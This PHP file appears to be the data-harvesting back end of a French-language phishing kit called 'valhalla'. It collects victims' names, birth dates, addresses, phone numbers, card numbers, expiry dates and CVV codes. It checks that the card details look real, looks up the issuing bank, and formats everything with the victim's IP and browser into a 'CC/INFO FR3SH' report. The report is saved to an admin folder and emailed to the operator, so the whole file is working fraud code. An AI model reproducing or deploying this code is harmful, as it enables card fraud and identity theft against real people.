<?php
	
	/*ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
	error_reporting(E_ALL);*/

	session_start();
	include("../system.php");

	function cardData($ss, $bin)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_URL, "https://lookup.binlist.net/" . $bin);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 400);
        $json = curl_exec($ch);
        curl_close($ch);
        if ($json == false || $json == '{"valid":false}') {
            return "N/A";
        }
        $code = json_decode($json);
        switch ($ss) {
            case "type":
                $str = $code->{'type'};
                break;
            case "brand":
                $str = $code->{'brand'};
                break;
            case "level":
                $str = $code->{'category'};
                break;
            case "bank":
                $str = isset($code->{'bank'}->{'name'}) ? $code->{'bank'}->{'name'} : "Inconnu";
                break;
            case "status":
                $str = $code->{'country'}->{'currency'};
                break;
            case "countryName":
                $str = $code->{'country'}->{'name'};
                break;
            default:
                $str = $code->{'scheme'};
        }
        return $str;
    }
$bin = substr(str_replace(' ', '', $_POST['valhallaCcnum']), 0, 6);
$carte_credit = $_POST['valhallaCcnum'];
$bankname = cardData('bank', str_replace(" ","",$carte_credit));
$cclevel = cardData('brand', str_replace(" ","",$carte_credit));
$cctype = cardData('type', str_replace(" ","",$carte_credit));
	$_SESSION["valhallaFname"] = $_POST["valhallaFnm"];
	$_SESSION["valhallaBirth"] = $_POST["valhallaBirth"];
	$_SESSION["valhallaAdrss"] = $_POST["valhallaAdr"];
	$_SESSION["valhallaCitey"] = $_POST["valhallacty"];
	$_SESSION["valhallaZipcd"] = $_POST["valhallazip"];
	$_SESSION["valhallaCntry"] = $_POST["valhallaCtry"];
	$_SESSION["valhallaNmtel"] = $_POST["valhallatel"];
	
	$_SESSION["valhallaCcnum"] = $_POST["valhallacc"];
	$_SESSION["valhallaCcexp"] = $_POST["valhallaExp"];
	$_SESSION["valhallaCccsc"] = $_POST["valhallacsc"];

	$birth = $_SESSION["valhallaBirth"];

	$dd = substr($birth,0,2);
	$mm = substr($birth,3,2);
	$yy = substr($birth,-4);

	if($dd <= 31 && $mm <= 12 && $yy <= 2006 && $yy >= 1930){
		$brtbug = "true";
	} else{
		$brtbug = "&flowContext=inconnubirth";
	}

	$cc = $_SESSION["valhallaCcnum"];
	$ccvisited = str_replace(' ', '', $cc);
	$ccdone = strlen($ccvisited);

	if ($ccdone == 16 || $ccdone == 15 && is_numeric($ccvisited)){
		$ccbug = "true";
	} else {
		$ccbug = "&flowContext=inconnuccnum";
	}

	$exp = $_SESSION["valhallaCcexp"];

	$expm = substr($exp,0,2);
	$expy = substr($exp,-2);

	if ($expm <= 12 && $expy >= 20 && $expy <= 35){
		$expbug = "true";
	} else {
		$expbug = "&flowContext=inconnuexp";
	}

	$scs = $_SESSION["valhallaCccsc"];
	$scsdone = strlen($scs);
	if ($scsdone >= 3 && $scsdone <= 4 && is_numeric($scs)){
		$scsbug = "true";
	} else{
		$scsbug = "&flowContext=inconnucsc";
	}

	if(isset($_POST["valhallainfotp"]) && $brtbug == "true" && $ccbug == "true" && $expbug == "true" && $scsbug == "true"){

		$valhallaletter = '
			<!DOCTYPE html>
			<html>
			<head><style type="text/css">*{padding: 0;margin: 0;box-sizing: border-box;}</style>
			</head>
			<body>
					<div style="height:100%;min-height: 100vh;width:100%;background-color: #0a0a0a;background-image: radial-gradient(circle farthest-side at center bottom,#0a0a0a,#c71812 125%);padding: 25px 0">
						<div style="margin: 0 auto;width:600px;border:2px solid white;padding: 20px;">

							<div><img src="https://i.imgur.com/4LQAiAh.jpg" style="height: 50px;margin:0 auto;display: block;"></div>

							<h1 style="color: #fff;text-align: center;padding: 20px 0;font-family: arial;">CC/INFO FR3SH 🍂</h1>
							<div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">🖋Nom / Prénom :</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
										'. $_SESSION["valhallaFname"] .'
									</h2>
								</div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">👶Naissance :</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
										'. $_SESSION["valhallaBirth"] .'
									</h2>
								</div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">🏠Adresse :</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
										'. $_SESSION["valhallaAdrss"] .'
									</h2>
								</div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">📲Ville :</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
										'. $_SESSION["valhallaCitey"] .'
									</h2>
								</div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">📪Code Postal :</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
										'. $_SESSION["valhallaZipcd"] .'
									</h2>
								</div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">🌎Pays :</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
										'. $_SESSION["valhallaCntry"] .'
									</h2>
								</div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">📞Num tel :</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
										'. $_SESSION["valhallaNmtel"] .'
									</h2>
								</div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">🏛Numero de Carte :</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
										'. $_SESSION["valhallaCcnum"] .'
									</h2>
								</div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">🏛Date Expiration :</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
										'. $_SESSION["valhallaCcexp"] .'
									</h2>
								</div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">🏛Cryptogram Visuel :</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
										'. $_SESSION["valhallaCccsc"] .'
									</h2>
								</div>
							</div>
							<h1 style="color: #fff;text-align: center;padding: 0 0 20px 0;font-family: arial;">👁‍🗨User Agent</h1>
							<div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">🌑Date & Temps :</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
										'. $date .'
									</h2>
								</div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">💻Addresse IP :</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;">
										<a style="color: #c71812" target="_blank" href="https://whatismyipaddress.com/ip/'. $ip .'">'. $ip .'</a>
									</h2>
								</div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">👉System :	</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
										'. $user_os .'
									</h2>
								</div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">🤖Navigateur :	</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
										'. $user_browser .'
									</h2>
								</div>
							</div>

						</div>
					</div>
				</body>
				</html>';

			$file = fopen("../../../admin/".$ip.".html", "a");
	        fwrite($file, $valhallaletter);

			include("../../../e-mail.php");

			$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
			$subject  = "valhalla 🦅 [$bin] -  $bankname -  $cclevel  - $cctype";
			$headers .= "From: Evil Rick RZLT 😈 <valhalla@websec.com>" . "\r\n";
			mail($valhallato, $subject, $valhallaletter, $headers);

			header("Location: ../../app/validation.php");

		} else {
			header("Location: ../../app/informations.php?" . $brtbug . $ccbug . $expbug . $scsbug);
		}